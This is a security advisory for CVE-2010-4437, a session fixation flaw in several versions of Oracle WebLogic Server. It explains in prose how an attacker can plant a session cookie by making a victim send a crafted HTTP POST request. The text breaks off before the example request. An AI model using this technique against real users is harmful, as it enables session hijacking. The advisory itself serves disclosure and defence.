Name	Oracle WebLogic – Session Fixation Via HTTP POST Request
Vendor Website	http://www.oracle.com/
Date Released	11 March 2011 – CVE-2010-4437
Affected Software	Oracle WebLogic Server 9.0, 9.1, 9.2.4, 10.0.2, 10.3.2, 10.3.3
Researcher	Roberto Suggi Liverani

Description

Oracle WebLogic servlet session cookie can be fixated via HTTP POST request. This type of session fixation attack has been confirmed with different session descriptor elements. In particular, the attack has also been confirmed with the session descriptor element <url-rewriting-enabled> set to "False". Such setting prevents session fixation attack via HTTP GET request but fails to mitigate session fixation attacks performed over HTTP POST.

Exploitation

A malicious user obtains a valid servlet session (e.g. AFSSESSIONID) and then forces a user to perform an HTTP POST request which sets the AFSSESSIONID cookie into the user's browser. The cookie AFSESSIONID is passed as a parameter within the body of the HTTP POST request to the Oracle WebLogic Server, as shown below:
